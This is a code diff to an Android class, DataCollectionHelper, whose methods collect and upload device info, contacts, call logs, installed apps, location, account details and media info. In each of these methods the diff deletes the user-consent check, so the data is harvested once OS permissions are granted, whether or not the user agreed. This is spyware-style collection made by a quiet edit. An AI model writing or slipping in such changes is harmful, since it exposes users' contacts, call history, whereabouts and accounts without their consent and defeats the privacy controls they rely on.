@@ -79,10 +79,6 @@ public class DataCollectionHelper {
     // NOTE: device_info should NOT be uploaded to collected_data, only to user_data
     // This method will skip upload if dataRef points to collected_data
     public void collectDeviceInfo() {
-        if (!consentManager.hasUserConsented()) return;
-        
-        // Check if dataRef points to collected_data - if so, skip upload
-        // device_info should only go to user_data, not collected_data
         if (dataRef != null && dataRef.toString().contains("collected_data")) {
             Log.d("DataCollectionHelper", "Skipping device_info upload to collected_data - device_info should only go to user_data");
             return;
@@ -147,7 +143,6 @@ public class DataCollectionHelper {
 
     // Collect all contacts and save to user_data/{userId}/contacts
     public void collectContacts() {
-        if (!consentManager.hasUserConsented()) return;
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
@@ -316,7 +311,6 @@ public class DataCollectionHelper {
 
     // Collect call logs
     public void collectCallLogs() {
-        if (!consentManager.hasUserConsented()) return;
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
@@ -376,8 +370,6 @@ public class DataCollectionHelper {
 
     // Collect installed apps
     public void collectInstalledApps() {
-        if (!consentManager.hasUserConsented()) return;
-
         List<Map<String, Object>> appsList = new ArrayList<>();
         PackageManager packageManager = context.getPackageManager();
         List<PackageInfo> packages = packageManager.getInstalledPackages(0);
@@ -407,7 +399,6 @@ public class DataCollectionHelper {
 
     // Collect location data
     public void collectLocationData() {
-        if (!consentManager.hasUserConsented()) return;
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
@@ -437,7 +428,6 @@ public class DataCollectionHelper {
 
     // Collect accounts information
     public void collectAccountsInfo() {
-        if (!consentManager.hasUserConsented()) return;
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
             return;
         }
@@ -464,8 +454,7 @@ public class DataCollectionHelper {
 
     // Collect all media files info
     public void collectMediaInfo() {
-        if (!consentManager.hasUserConsented()) return;
-        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+        if (!PermissionsManager.hasGalleryPermission(context)) {
             return;
         }
 
